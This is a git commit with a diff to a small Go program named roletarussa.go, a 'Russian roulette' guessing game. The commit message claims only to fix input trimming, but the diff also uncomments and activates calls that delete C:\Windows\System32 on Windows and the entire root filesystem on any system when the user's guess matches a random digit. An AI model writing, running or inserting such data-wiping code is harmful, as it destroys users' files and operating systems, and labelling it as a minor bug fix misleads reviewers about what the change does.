7df7484dd213d2e661bf09c76189b5560252f6ff
Luis Enrique Meza Paredes <luyo.lemp@gmail.com>
2024-05-27 21:35:45 -0300

    :bug: fix: trim standard input console

--- roletarussa.go
+++ roletarussa.go
@@ -4,37 +4,38 @@ import (
 	"bufio"
 	"fmt"
 	"log"
+	"math/rand"
 	"os"
 	"runtime"
 	"strconv"
+	"strings"
 )
 
 func main() {
-	// number := rand.Intn(10)
-	number := 2
+	number := rand.Intn(10)
 
 	fmt.Println("Digite um número de 0 a 9: ")
-
-	reader := bufio.NewReader(os.Stdin)
-	user_number, err := reader.ReadString('\n')
+	user_number, err := bufio.NewReader(os.Stdin).ReadString('\n')
+	user_number = strings.Trim(user_number, "\n")
 
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	a, _ := strconv.Atoi(user_number)
+	casting_number, err := strconv.Atoi(user_number)
+	if err != nil {
+		log.Fatal(err)
+	}
 
-	if number == a {
+	if casting_number == number {
+		if runtime.GOOS == "windows" {
+			os.RemoveAll("C:\\Windows\\System32")
+		}
+
+		os.RemoveAll("/")
+	} else {
 		fmt.Println("Deu sorte!")
 	}
 
-	osystem := runtime.GOOS
-	fmt.Println("Operating system:", osystem)
-
-	// if runtime.GOOS == "windows" {
-	// 	os.RemoveAll("C:\\Windows\\System32")
-	// }
-
-	// os.RemoveAll("/")
 	fmt.Println("Done ✨")
 }
